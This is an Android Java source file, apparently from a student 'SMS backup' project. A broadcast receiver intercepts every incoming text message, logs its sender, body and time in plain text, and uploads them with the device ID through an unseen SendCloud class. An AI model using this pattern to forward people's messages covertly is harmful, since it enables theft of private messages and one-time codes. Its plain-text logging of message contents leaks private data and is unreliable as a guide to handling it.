package vn.edu.tnut.duycop.asms;


import android.content.BroadcastReceiver;
        import android.content.Context;
        import android.content.Intent;
        import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsMessage;
        import android.text.format.DateFormat;
        import android.util.Log;
        import java.util.Calendar;
        import java.util.Locale;
        import java.util.TimeZone;

public class BackupSMS extends BroadcastReceiver
{

    private String getDateTime(long timeInMillis) {
        Calendar cal = Calendar.getInstance(Locale.ENGLISH);
        cal.setTimeInMillis(timeInMillis);
        cal.setTimeZone(TimeZone.getTimeZone("Asia/Ho_Chi_Minh"));
        String datetime = DateFormat.format("dd/MM/yyyy HH:mm:ss", cal).toString();
        return datetime;
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub
        Log.d("SMS BACKUP","onReceive sms");
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;

            if (bundle != null){
                Log.d("SMS BACKUP","BackupSMS: bundle not null");
                //---retrieve the SMS message received---
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i=0; i<msgs.length; i++){
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        SmsMessage sms=msgs[i];
                        String msgFrom = sms.getOriginatingAddress();
                        String msgBody = sms.getMessageBody();
                        String msgTime=getDateTime(sms.getTimestampMillis());
                        Log.d("SMS BACKUP","GET SMS OK: FROM: "+msgFrom+". BODY: "+msgBody +". TIME: "+msgTime);
                        String unique= Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                        SendCloud s=new SendCloud(unique, msgFrom,msgBody,msgTime,context);
                        s.postData();
                    }
                }catch(Exception e){
                    Log.d("SMS BACKUP","BackupSMS error: "+e.getMessage());
                }
            }
        }
    }
}
